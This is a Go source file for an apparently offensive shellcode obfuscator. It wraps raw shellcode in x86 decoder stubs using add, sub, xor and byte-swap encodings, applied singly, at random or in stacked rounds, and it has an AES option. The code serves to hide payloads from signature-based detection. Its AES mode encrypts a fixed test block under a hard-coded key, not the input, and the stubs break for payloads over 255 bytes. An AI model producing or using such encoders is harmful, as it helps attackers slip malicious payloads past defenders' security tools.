package main

import (
	"crypto/aes"
	crand "crypto/rand"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"time"
)

func contains(array []byte, b byte) bool {
	for i := 0; i < len(array); i++ {
		if array[i] == b {
			return true
		}
	}
	return false
}

func genRandomBytes(size int) []byte {
	randomBytes := make([]byte, size)
	for contains(randomBytes, 0x0) {
		_, err := crand.Read(randomBytes)
		check(err)
	}
	return randomBytes
}

func add(shellcode []byte, randomByte byte) []byte {
	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x6c\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
	decoder[6] = byte(len(shellcode))
	decoder[11] = byte(randomByte)

	for i := range shellcode {
		shellcode[i] += byte(randomByte)
	}
	return append(decoder, shellcode...)
}

func sub(shellcode []byte, randomByte byte) []byte {
	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x44\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
	decoder[6] = byte(len(shellcode))
	decoder[11] = byte(randomByte)

	for i := range shellcode {
		shellcode[i] -= byte(randomByte)
	}
	return append(decoder, shellcode...)
}

func xor(shellcode []byte, randomByte byte) []byte {
	decoder := []byte("\xeb\x11\x5f\x31\xc9\xb1\x00\x80\x74\x0f\xff\x00\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff")
	decoder[6] = byte(len(shellcode))
	decoder[11] = byte(randomByte)

	for i := range shellcode {
		shellcode[i] ^= byte(randomByte)
	}
	return append(decoder, shellcode...)
}

func swap(shellcode []byte) []byte {
	decoder := []byte("\xeb\x20\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x00\x8a\x44\x0e\xff\x8a\x5c\x0e\xfe\x88\x5c\x0e\xff\x88\x44\x0e\xfe\x80\xe9\x02\x75\xeb\xeb\x05\xe8\xdb\xff\xff\xff")

	shellcodeLen := len(shellcode)
	if shellcodeLen%2 != 0 {
		shellcode = append(shellcode, 0x90)
		shellcodeLen += 1
	}
	decoder[10] = byte(shellcodeLen)
	for i := 0; i < shellcodeLen; i += 2 {
		shellcode[i], shellcode[i+1] = shellcode[i+1], shellcode[i]
	}
	return append(decoder, shellcode...)
}

func printShellcode(shellcode []byte) {
	fmt.Println("Shellcode len:", len(shellcode))
	fmt.Println("Shellcode:")
	for i := range shellcode {
		fmt.Printf("\\x%02x", shellcode[i])
	}
	fmt.Println()
}

func random(shellcode []byte) []byte {
	randomByte := genRandomBytes(1)[0]
	method := rand.Intn(4)
	if method == 0 {
		fmt.Printf("[+] Add method (0x%x)\n", randomByte)
		return add(shellcode, randomByte)
	} else if method == 1 {
		fmt.Printf("[-] Sub method (0x%x)\n", randomByte)
		return sub(shellcode, randomByte)
	} else if method == 2 {
		fmt.Printf("[^] Xor method (0x%x)\n", randomByte)
		return xor(shellcode, randomByte)
	} else if method == 3 {
		fmt.Printf("[~] Swap method\n")
		return swap(shellcode)
	}
	return shellcode
}

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func crazy(shellcode []byte) []byte {
	rand.Seed(time.Now().UTC().UnixNano())
	order := rand.Perm(4)
	for i := range order {
		randomByte := genRandomBytes(1)[0]
		if i == 0 {
			shellcode = add(shellcode, randomByte)
			fmt.Printf("[+] Add method (0x%x)\n", randomByte)
		}
		if i == 1 {
			shellcode = sub(shellcode, randomByte)
			fmt.Printf("[-] Sub method (0x%x)\n", randomByte)
		}
		if i == 2 {
			shellcode = xor(shellcode, randomByte)
			fmt.Printf("[^] Xor method (0x%x)\n", randomByte)
		}
		if i == 3 {
			shellcode = swap(shellcode)
			fmt.Printf("[~] Swap method\n")
		}
	}

	return shellcode
}

func brainless(shellcode []byte, rounds uint) []byte {
	for i := 0; i < int(rounds); i++ {
		shellcode = random(shellcode)
	}
	return shellcode
}

/*########################################*/

func aesEncrypt(shellcode []byte, key []byte) []byte {
	encrypted := make([]byte, len(shellcode))
	cipher, _ := aes.NewCipher(key)
	size := 16

	for bs, be := 0, size; bs < len(shellcode); bs, be = bs+size, be+size {
		cipher.Encrypt(encrypted[bs:be], shellcode[bs:be])
	}

	return encrypted
}

/*########################################*/

func banner() {
	fmt.Print(`

		██████╗  ██████╗ ██╗  ██╗   ██╗ ██████╗  ██████╗ 
		██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝██╔════╝ ██╔═══██╗
		██████╔╝██║   ██║██║   ╚████╔╝ ██║  ███╗██║   ██║
		██╔═══╝ ██║   ██║██║    ╚██╔╝  ██║   ██║██║   ██║
		██║     ╚██████╔╝███████╗██║   ╚██████╔╝╚██████╔╝
		╚═╝      ╚═════╝ ╚══════╝╚═╝    ╚═════╝  ╚═════╝ 
                 
		
			  made with ♥ by leco & atsika

`)

}

func main() {

	banner()

	argAes := flag.Bool("aes", false, "Encrypt shellcode using AES-128-ECB")
	argBrainless := flag.Uint("brainless", 0, "Specify the number of recursive encapsulated obfuscation methods")
	argCrazy := flag.Bool("crazy", false, "Recursively obfuscate the shellcode with all methods")
	argFile := flag.String("f", "", "File containing raw shellcode")
	argXor := flag.Bool("xor", false, "Use xor ofuscation")
	argAdd := flag.Bool("add", false, "Use add ofuscation")
	argSub := flag.Bool("sub", false, "Use sub ofuscation")
	argSwap := flag.Bool("swap", false, "Use swap ofuscation")
	argRandom := flag.Bool("random", false, "Use random ofuscation")

	flag.Parse()

	if *argFile == "" {
		fmt.Println("Missing -f argument. Try", os.Args[0], "-h.")
		os.Exit(1)
	}

	shellcode, err := ioutil.ReadFile(*argFile)
	check(err)

	randomByte := genRandomBytes(1)[0]

	if *argAdd {
		shellcode = add(shellcode, randomByte)
	} else if *argSub {
		shellcode = sub(shellcode, randomByte)
	} else if *argXor {
		shellcode = xor(shellcode, randomByte)
	} else if *argSwap {
		shellcode = swap(shellcode)
	} else if *argRandom {
		shellcode = random(shellcode)
	} else if *argCrazy {
		shellcode = crazy(shellcode)
	} else if *argBrainless != 0 {
		shellcode = brainless(shellcode, *argBrainless)
	} else if *argAes {
		//key := genRandomBytes(16)
		key := []byte{0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x9, 0xcf, 0x4f, 0x3c}
		shellcode = []byte{0x32, 0x43, 0xf6, 0xa8, 0x88, 0x5a, 0x30, 0x8d, 0x31, 0x31, 0x98, 0xa2, 0xe0, 0x37, 0x7, 0x34}
		shellcode = aesEncrypt(shellcode, key)
	} else {
		fmt.Println("Missing arguments. Specify an obfuscation method. Try", os.Args[0], "-h.")
		os.Exit(1)
	}

	printShellcode(shellcode)
}
